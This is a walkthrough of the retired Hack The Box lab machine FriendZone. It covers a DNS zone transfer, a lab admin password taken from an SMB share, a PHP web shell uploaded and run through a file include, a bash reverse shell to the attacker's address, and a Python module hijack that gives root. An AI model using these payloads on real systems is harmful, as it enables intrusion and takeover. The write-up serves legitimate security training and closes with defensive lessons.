---
title: "Hack The Box — FriendZone"
summary: "FriendZone leaks virtual hosts through DNS and admin credentials through SMB; a PHP include executes an uploaded file, then a writable Python module leads to root."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Easy"
os: "Linux"
solvedAt: 2026-11-25
publishedAt: 2026-11-25
tags:
  - dns-zone-transfer
  - smb
  - virtual-hosts
  - local-file-inclusion
  - remote-code-execution
  - python-module-hijacking
  - privilege-escalation
tools:
  - Nmap
  - dig
  - smbmap
  - smbclient
  - Netcat
cves: []
htbUrl: "https://app.hackthebox.com/machines/friendzone"
cover: "/images/writeups/hackthebox/machines/friendzone/friendzone.png"
coverAlt: "Hack The Box FriendZone machine logo with a red masked figure inside a green circle"
featured: false
draft: false
---

> This write-up documents an authorized Hack The Box lab. FriendZone was described as a [recently retired machine on the Hack The Box forum in July 2019](https://forum.hackthebox.com/t/friendzone-writeup-by-nuti/1716), meeting the [HTB publication rule](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines). Flag values and session-specific target and VPN addresses are omitted. The admin password below is a fixed credential from this retired lab and is included so the path can be reproduced.

## Executive summary

FriendZone rewards careful enumeration across several services. The HTTPS certificate reveals `friendzone.red`, and an unrestricted DNS zone transfer exposes its virtual hosts. An anonymously readable SMB share contains credentials for the administrator site, while a second share permits anonymous writes. The authenticated dashboard includes a PHP file selected by the `pagename` parameter. Uploading a PHP command handler through SMB and including its filesystem path produces a shell as `www-data`. Finally, a root-run Python job imports a world-writable `os.py` module. Code appended to that module runs when the job starts and grants a root shell.

## Target information

| Item | Value |
| --- | --- |
| Target | FriendZone |
| Platform | Hack The Box |
| Difficulty | Easy |
| Operating system | Linux |
| Publication policy | Retired; [HTB forum evidence](https://forum.hackthebox.com/t/friendzone-writeup-by-nuti/1716) |
| Solved | 25 November 2026 |
| Main weaknesses | DNS zone transfer, exposed SMB credentials, writable SMB share, unsafe PHP inclusion, world-writable Python module |

Use the address assigned to your own instance as `<TARGET_IP>`. Replace `<YOUR_TUN0_IP>` with the IPv4 address of your Kali VPN interface. Neither address is fixed across players.

## Enumeration

### Service scan

I scanned all TCP ports with default scripts and version detection:

```bash
nmap <TARGET_IP> -T5 -sCV -p-
```

The relevant open ports were:

```text
21/tcp   ftp       vsftpd 3.0.3
22/tcp   ssh       OpenSSH 7.6p1
53/tcp   domain    ISC BIND 9.11.3
80/tcp   http      Apache 2.4.29
139/tcp  netbios   Samba
443/tcp  ssl/http  Apache 2.4.29
445/tcp  smb       Samba 4.7.6
```

The TLS certificate on port 443 named `friendzone.red`. The scan also reported many filtered high ports and a retransmission warning with `-T5`; those ports did not contribute to this path. DNS and SMB offered the clearest next checks.

### DNS zone transfer and virtual hosts

Ask the target DNS server for its entire `friendzone.red` zone:

```bash
dig @<TARGET_IP> friendzone.red AXFR
```

The transfer returned three useful hostnames:

```text
administrator1.friendzone.red.  A  127.0.0.1
hr.friendzone.red.              A  127.0.0.1
uploads.friendzone.red.         A  127.0.0.1
```

Those A records point to loopback. To reach the virtual hosts from Kali, map the names to the **assigned target IP** locally:

```bash
printf '%s friendzone.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red\n' '<TARGET_IP>' | sudo tee -a /etc/hosts
```

Then browse `https://administrator1.friendzone.red/`. Keep the same HTTPS hostname during login and dashboard requests so the browser sends the session cookie.

### SMB shares and credentials

Anonymous SMB enumeration exposed both the credentials and the upload location:

```bash
smbmap -H <TARGET_IP>
smbclient -L //<TARGET_IP> -N
```

| Share | Anonymous access | Relevance |
| --- | --- | --- |
| `general` | Read | Contains `creds.txt` |
| `Development` | Read, write | Accepts the PHP file used later |
| `Files` | None | Its share comment reveals an `/etc/Files` path convention |

Download the credential file:

```bash
smbclient //<TARGET_IP>/general -N
# At the smb: prompt:
ls
get creds.txt
exit
cat creds.txt
```

The file contains the lab's admin credential:

```text
admin:WORKWORKHhallelujah@#
```

## Initial access

### Authenticate and identify the include

Visit `https://administrator1.friendzone.red/` and submit the credential through its login form. Opening `/login.php` directly with a GET request returned `Wrong !` during this run; the form at `/` is the correct entry point. After login, open `/dashboard.php`.

The dashboard suggests `image_id=a.jpg&pagename=timestamp`. Request it while the browser is authenticated:

```text
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp
```

The page prints a final access timestamp. It also says the image parameter is wrong, but the timestamp proves that `pagename=timestamp` loads `timestamp.php`. This behavior is consistent with the application appending `.php` to the selected name. The security boundary fails because an attacker-controlled path can reach PHP files outside the intended web directory. PHP's [`include` documentation](https://www.php.net/manual/en/function.include.php) explains that the selected file is evaluated, including when an absolute path is supplied.

### Upload a PHP command handler through SMB

Create a minimal handler on Kali:

```bash
printf '%s\n' '<?php system($_GET["cmd"]); ?>' > shell.php
smbclient //<TARGET_IP>/Development -N
# At the smb: prompt:
put shell.php
exit
```

The share maps to `/etc/Development` on the target. With the authenticated browser session, include the uploaded file and test a harmless command:

```text
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/shell&cmd=id
```

Pass `shell`, **without** `.php`, because the dashboard adds that extension. The response contains:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

That confirms server-side execution as the web server user. The combination matters: SMB gives file write access, and the PHP include evaluates the same file by its absolute path.

### Get an interactive shell

Find your Kali VPN address and start a listener in a separate terminal:

```bash
ip -4 -br addr show tun0
nc -lvnp 4444
```

Generate a URL-encoded reverse-shell request, replacing `<YOUR_TUN0_IP>` with that address:

```bash
python3 - <<'PY'
from urllib.parse import quote

attacker_ip = '<YOUR_TUN0_IP>'
command = f"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/4444 0>&1'"
base = 'https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/shell&cmd='
print(base + quote(command))
PY
```

Open the printed URL in the **same logged-in browser**. The page may keep loading while Netcat receives a shell. Confirm the account:

```bash
id
# uid=33(www-data) ...
```

The user flag is in `/home/friend/user.txt`; its value is intentionally omitted here.

## Privilege escalation

Inspect the local Python job and module permissions from the `www-data` shell:

```bash
cat /opt/server_admin/reporter.py
ls -l /usr/lib/python2.7/os.py
test -w /usr/lib/python2.7/os.py && echo WRITABLE
```

`reporter.py` imports `os` and is run periodically as root. The module permission observed on this instance was:

```text
-rwxrwxrwx 1 root root ... /usr/lib/python2.7/os.py
WRITABLE
```

This is a Python module hijack: the low-privileged user can change code that a privileged Python process imports. Appending a line preserves the rest of the module while executing a command during import:

```bash
echo 'import os; os.system("chmod u+s /bin/bash")' >> /usr/lib/python2.7/os.py
tail -n 1 /usr/lib/python2.7/os.py
```

Wait for the scheduled job and check the bit before launching the shell:

```bash
sleep 75
ls -l /bin/bash
# -rwsr-xr-x 1 root root ... /bin/bash
/bin/bash -p
id
# euid=0(root)
```

Running `/bin/bash -p` immediately after appending the line still returned `www-data`; the scheduled job had not run yet. After about 75 seconds, `/bin/bash` had the setuid bit and the same command produced a root effective UID. The root flag is in `/root/root.txt`; its value is omitted.

After confirming the flag, remove the injected final line and setuid bit from the lab instance:

```bash
tail -n 1 /usr/lib/python2.7/os.py  # Confirm this is still your injected line
sed -i '$d' /usr/lib/python2.7/os.py
chmod u-s /bin/bash
```

## What did not work

- A direct visit to `/login.php` returned `Wrong !` because the credentials must be submitted through the form at the admin vhost root.
- The dashboard said the image parameter was wrong, yet `pagename=timestamp` still printed the timestamp. The include remained the useful behavior.
- `/bin/bash -p` before the next cron run stayed at `www-data`; the permission change had to appear first.

## Attack path

1. Read the HTTPS certificate and transfer the `friendzone.red` DNS zone to discover virtual hosts.
2. Enumerate SMB: download admin credentials from `general` and identify the writable `Development` share.
3. Authenticate to the administrator vhost and confirm that `pagename` includes a PHP file.
4. Upload `shell.php` through SMB and include `/etc/Development/shell` for command execution as `www-data`.
5. Append code to the world-writable Python `os.py` imported by a root-run job, wait for the job, and enter a setuid Bash shell.

## Lessons learned

- Check DNS zone transfers when a target runs a DNS server. Even loopback A records can disclose useful virtual hostnames.
- Treat network share comments and permissions as filesystem clues. A writable share becomes more serious when another service can load files from its path.
- Keep untrusted input out of PHP include paths. A fixed allowlist of application views would prevent this path selection.
- Privileged scripts must import only modules that unprivileged users cannot edit. World-writable standard library files turn routine cron execution into privilege escalation.

## References

- [Hack The Box forum: FriendZone retired announcement](https://forum.hackthebox.com/t/friendzone-writeup-by-nuti/1716)
- [Hack The Box publication guidelines](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines)
- [Nmap reference guide](https://nmap.org/book/man.html)
- [PHP manual: `include`](https://www.php.net/manual/en/function.include.php)
